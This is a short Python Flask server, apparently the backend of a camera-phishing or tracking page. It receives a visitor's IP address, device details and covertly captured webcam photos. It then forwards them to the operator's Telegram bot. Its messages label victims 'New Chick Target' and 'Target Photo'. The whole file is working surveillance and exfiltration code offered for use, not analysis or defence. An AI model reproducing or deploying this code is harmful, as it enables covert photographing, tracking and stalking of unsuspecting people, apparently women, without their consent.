from flask import Flask, request, jsonify
import requests
import os, base64, time

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YAHAN_APNA_TOKEN_DALO")
MY_CHAT_ID = os.environ.get("MY_CHAT_ID", "YAHAN_APNI_CHAT_ID_DALO")

@app.route('/log_ip', methods=['POST'])
def log_ip():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Bina kisi extra library ke user agent nikal rahe hain
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    msg = (f"<b>🎯 New Chick Target!</b>\n\n"
           f"<b>IP Address:</b> <code>{ip}</code>\n"
           f"<b>Device Info:</b> {user_agent}\n"
           f"<b>Screen:</b> {data.get('screen')}")
    
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  json={"chat_id": MY_CHAT_ID, "text": msg, "parse_mode": "HTML"})
    return jsonify({"status": "ok"})

@app.route('/upload_cam', methods=['POST'])
def upload_cam():
    data = request.json
    img_base64 = data.get('image')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    if img_base64:
        img_data = img_base64.split(',')[1]
        img_bytes = base64.b64decode(img_data)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('camera.jpg', img_bytes, 'image/jpeg')}
        payload = {'chat_id': MY_CHAT_ID, 'caption': f"📸 Target Photo | IP: {ip}"}
        
        requests.post(url, data=payload, files=files)
        time.sleep(1)
    return jsonify({"status": "ok"})
